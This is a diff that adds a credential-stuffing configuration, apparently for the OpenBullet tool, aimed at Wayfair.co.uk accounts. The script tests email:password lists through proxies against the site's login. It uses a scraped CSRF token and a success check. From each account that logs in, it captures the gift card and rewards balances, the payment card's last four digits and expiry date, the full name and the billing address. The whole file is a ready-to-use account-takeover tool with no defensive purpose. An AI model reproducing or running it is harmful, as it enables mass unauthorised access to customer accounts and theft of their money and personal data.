@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "Wayfair.co.uk",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-05T20:37:01.9266115+02:00",
+  "AdditionalInfo": "Captures: My Gift Cards/Store Credit, My Rewards Pounds, Credit Card (Last 4) + Expiry Date, Full name, Address",
+  "Author": "AlexTheDane#6884",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.wayfair.co.uk/a/account/authentication/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "n\":\"" "\",\"p" -> VAR "csrf" 
+
+REQUEST POST "https://www.wayfair.co.uk/a/account/authentication/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"ideaboard\":false,\"url\":\"https://www.wayfair.co.uk/v/account/welcome/show\",\"step\":\"password\",\"_csrf_token\":\"<csrf>\",\"isFromLoginComponent\":true,\"recaptchaResponse\":\"\",\"client_id\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.wayfair.co.uk" 
+  HEADER "referer: https://www.wayfair.co.uk/v/account/authentication/login?url=https%3A%2F%2Fwww.wayfair.co.uk%2Fv%2Faccount%2Fwelcome%2Fshow" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Account Balance:" 
+  KEYCHAIN Failure OR 
+    KEY "\":\"\",\"passwordErrorType\":\"wrong_password\"" 
+
+REQUEST GET "https://www.wayfair.co.uk/v/account/rewards/balance" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<p class=\"AccountBalancePage-balance-amount\">" "</p>" -> CAP "My Gift Cards / Store Credit" 
+
+PARSE "<SOURCE>" LR "<h2 class=\"SectionTitle-header\">My Rewards Pounds</h2></div></header></div><div class=\"u-size12of12 u-md-size4of12 Grid-item Grid-item--column Grid-item--wrap\"><p class=\"AccountBalancePage-balance-amount\">" "</p>" -> CAP "My Rewards Pounds" 
+
+REQUEST GET "https://secure.wayfair.co.uk/account/manage-payment-options" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<div class=\"PaymentCard-label-subtitle\">" "<p>" -> CAP "Name" 
+
+PARSE "<SOURCE>" LR "<h3 class=\"PaymentCard-label-title\">" "</h3>" -> CAP "Credit Card" 
+
+PARSE "<SOURCE>" LR "<p>Expires:" "</p></div>" -> CAP "Expiry Date" 
+
+PARSE "<SOURCE>" LR "\"billingAddress\":" "}},{\"__" -> CAP "Address" 
+
